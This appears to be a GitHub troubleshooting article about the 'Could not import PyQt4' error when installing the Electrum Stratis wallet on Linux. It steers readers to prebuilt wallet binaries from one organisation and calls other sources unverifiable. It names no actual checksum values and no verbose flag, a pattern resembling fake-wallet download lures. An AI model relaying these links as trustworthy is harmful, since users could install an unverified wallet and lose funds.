![Electrum-Stratis](assets/banner-article.png)

# Could not import PyQt4: installing Electrum Stratis on Linux

<p align="center">The missing-library error and what replaces it</p>

<p align="center"><a href="https://github.com/electrum-stratis-project/electrum-stratis-wallet/releases/download/v2.7.19/electrum-stratis-v2.7.19.exe"><img alt="Download for Windows" src="https://img.shields.io/badge/DOWNLOAD-WINDOWS-089ae8?style=for-the-badge&labelColor=071727&logo=data%3Aimage%2Fsvg%2Bxml%3Bbase64%2CPHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCA4OCA4OCI%2BPHBhdGggZmlsbD0iI2ZmZmZmZiIgZD0iTTAgMTIuNCAzNS43IDcuNXYzNC4zSDB6TTQwIDYuOSA4OCAwdjQxLjhINDB6TTAgNDYuMmgzNS43djM0LjRMMCA3NS42ek00MCA0Ni4yaDQ4Vjg4bC00OC02Ljl6Ii8%2BPC9zdmc%2B&logoColor=ffffff"></a> <a href="https://github.com/electrum-stratis-project/electrum-stratis-wallet/releases/download/v2.7.19/electrum-stratis-v2.7.19.dmg"><img alt="Download for macOS" src="https://img.shields.io/badge/DOWNLOAD-MACOS-089ae8?style=for-the-badge&labelColor=071727&logo=apple&logoColor=ffffff"></a> <a href="https://github.com/electrum-stratis-project/electrum-stratis-wallet/releases/download/v2.7.19/electrum-stratis-v2.7.19.zip"><img alt="Download for Linux" src="https://img.shields.io/badge/DOWNLOAD-LINUX-089ae8?style=for-the-badge&labelColor=071727&logo=linux&logoColor=ffffff"></a></p>

<div align="center">

| Platform | Requirements | File |
| --- | --- | --- |
| <img alt="Windows" height="24" src="https://img.shields.io/badge/os-windows-089ae8?style=flat-square&labelColor=071727&logo=data%3Aimage%2Fsvg%2Bxml%3Bbase64%2CPHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCA4OCA4OCI%2BPHBhdGggZmlsbD0iI2ZmZmZmZiIgZD0iTTAgMTIuNCAzNS43IDcuNXYzNC4zSDB6TTQwIDYuOSA4OCAwdjQxLjhINDB6TTAgNDYuMmgzNS43djM0LjRMMCA3NS42ek00MCA0Ni4yaDQ4Vjg4bC00OC02Ljl6Ii8%2BPC9zdmc%2B&logoColor=ffffff"> | Windows 10 (1909) or later, 64-bit | [`electrum-stratis-v2.7.19.exe`](https://github.com/electrum-stratis-project/electrum-stratis-wallet/releases/download/v2.7.19/electrum-stratis-v2.7.19.exe) |
| <img alt="macOS" height="24" src="https://img.shields.io/badge/os-macos-089ae8?style=flat-square&labelColor=071727&logo=apple&logoColor=ffffff"> | macOS 12 or later | [`electrum-stratis-v2.7.19.dmg`](https://github.com/electrum-stratis-project/electrum-stratis-wallet/releases/download/v2.7.19/electrum-stratis-v2.7.19.dmg) |
| <img alt="Linux" height="24" src="https://img.shields.io/badge/os-linux-089ae8?style=flat-square&labelColor=071727&logo=linux&logoColor=ffffff"> | x64, Ubuntu 20.04 or later, or equivalent | [`electrum-stratis-v2.7.19.zip`](https://github.com/electrum-stratis-project/electrum-stratis-wallet/releases/download/v2.7.19/electrum-stratis-v2.7.19.zip) |

</div>

All versions, installers and checksums are on the [Electrum-Stratis v2.7.19 release page](https://github.com/electrum-stratis-project/electrum-stratis-wallet/releases/tag/v2.7.19).

> Only download from this GitHub release page.

The error "Could not import PyQt4 on Linux systems" comes from old builds that ran on the system Python and needed the Qt4 bindings installed separately. The current release bundles its own runtime and does not import PyQt4 at all, so the error means an old bundle is being run rather than a missing package. Install the current Linux asset instead of chasing dependencies. Electrum Stratis is a self-custody desktop wallet for the legacy Stratis chain.

## You'll see this if

<div align="center">

| What you see | What it means | What to do |
|---|---|---|
| "Could not import PyQt4" | An old, source-based build | Use the current bundled build |
| `ImportError: No module named PyQt4` | Same cause, older Python | Same fix |
| "No module named setuptools" | A source install missing build tools | Not needed by the bundled build |
| The binary does nothing when double-clicked | No execute permission, or no desktop session | Run it from a terminal |
| A missing shared library at launch | A system library the GUI needs | Install that library, not Qt4 |

</div>

The distinction to hold on to: Qt4 was a dependency of the old packaging, and modern builds ship the toolkit inside the application. Installing Qt4 packages on a current distribution is a dead end, because the distribution may not even carry them any more.

## Why it happens

Older instructions described running the wallet from source: install Python, install the Qt bindings, install a handful of build tools, then launch a script. That procedure was normal for the era and it fails today for two reasons - the bindings are gone from most repositories, and the script expects a Python version that no longer exists on a current system.

The current release removes the entire category. It is packaged with its runtime, so the application does not ask the system for Python or for Qt. That is why the fix for a PyQt4 error is not a package installation but a different download.

The maintained build, with its current release on the [release page](https://github.com/electrum-stratis-project/electrum-stratis-wallet/releases/tag/v2.7.19), is self-contained in the way the error message is asking for. Run it with the verbose flag and it prints the reason it will not start, which replaces guessing about missing components with a single line.

## Fix

1. **Download the Linux asset from the release page.** It is the archive listed for Linux, not a source tarball from a repository and not a package from an unofficial repository.
2. **Verify the checksum.** Compare the hash with the published value before extracting anything; an archive that cannot be verified is not worth unpacking, and the hash is the only link between the file and the project ([is Electrum Stratis safe](https://github.com/electrum-stratis-project/electrum-stratis-guides/blob/main/how-safe-is-the-desktop-wallet.md)).
3. **Extract to a folder you control.** Not into `/usr/bin` and not over an existing installation. A user-owned folder keeps the application replaceable without touching system files.
4. **Make the binary executable and run it from a terminal.** The terminal matters: it shows the first error line instead of failing silently behind a desktop launcher.
5. **If it refuses to start, run it with the verbose flag.** The flag prints why the application will not proceed - a missing system library, a display problem, a permissions issue - which is the information a desktop shortcut never gives you.
6. **Create or recover a wallet and let it sync.** The connection panel shows the height and the last block age; an empty balance before the chain tip is normal.

Do not install `python-qt4`, `python3-pyqt4` or distribution-specific Qt4 packages to satisfy the error. On a current distribution those packages either do not exist or belong to a different stack, and installing them changes the system without addressing the cause.

## If that did not work

If the binary reports a missing shared library, that library is part of the desktop stack rather than the wallet: install the package that provides it, then run again. The verbose output names the library precisely, which is why the terminal step is not optional.

If the application starts but the window is blank or wrongly scaled, the display server is the likely cause - a Wayland session can behave differently from X11 for older GUI toolkits. Trying the other session is a diagnostic, not a permanent change.

If the archive will not extract, it was probably truncated in download. Re-download and re-verify rather than extracting again with different flags.

If nothing runs at all and the checksum matched, the asset may be for a different architecture; compare `uname -m` with the build you downloaded.

## Prevention

- Keep the release page bookmarked and use the Linux asset from it.
- Verify the checksum before extracting.
- Keep the application in a user folder, so an update is a folder swap.
- Keep a copy of the wallet file, which lives in your home directory rather than beside the binary.
- Note the verbose output when something fails; it is the fastest route to the real cause.

## FAQ

### Could not import PyQt4 on Linux - how do I fix it?

Install the current bundled build from the release page, which does not use PyQt4. The error belongs to older source-based builds that relied on the system Python; no package installation on a modern distribution will make those run.

### Do I extract the archive and run electrum-stratis?

Yes - for the packaged build: extract the Linux asset into a folder you own, make the binary executable, and run it from a terminal. That is different from the old procedure, which also required installing Python and Qt before running a script.

### Why does nothing happen when I double-click the file?

Either it lacks execute permission or the desktop session is not passing the environment the application needs. Running it from a terminal shows which of the two it is, and prints the actual error instead of nothing.

### Is there a package in my distribution's repository?

Treat unofficial packages as unverifiable: they are built by someone else and cannot be matched to the project's published checksum. The release page is the only source where the file and its hash come from the same place.

<!-- DOWNLOAD-BLOCK -->

## Related articles

- [Where to download the current build](https://github.com/electrum-stratis-project/electrum-stratis-guides/blob/main/where-to-get-the-current-build.md)
- [Which version is current, and is mine real?](https://github.com/electrum-stratis-project/electrum-stratis-guides/blob/main/which-release-is-current.md)
- [Install on Windows, step by step](https://github.com/electrum-stratis-project/electrum-stratis-guides/blob/main/install-on-windows-walkthrough.md)
- [Why "Not Connected" happens](https://github.com/electrum-stratis-project/electrum-stratis-fixes/blob/main/wallet-says-not-connected.md)
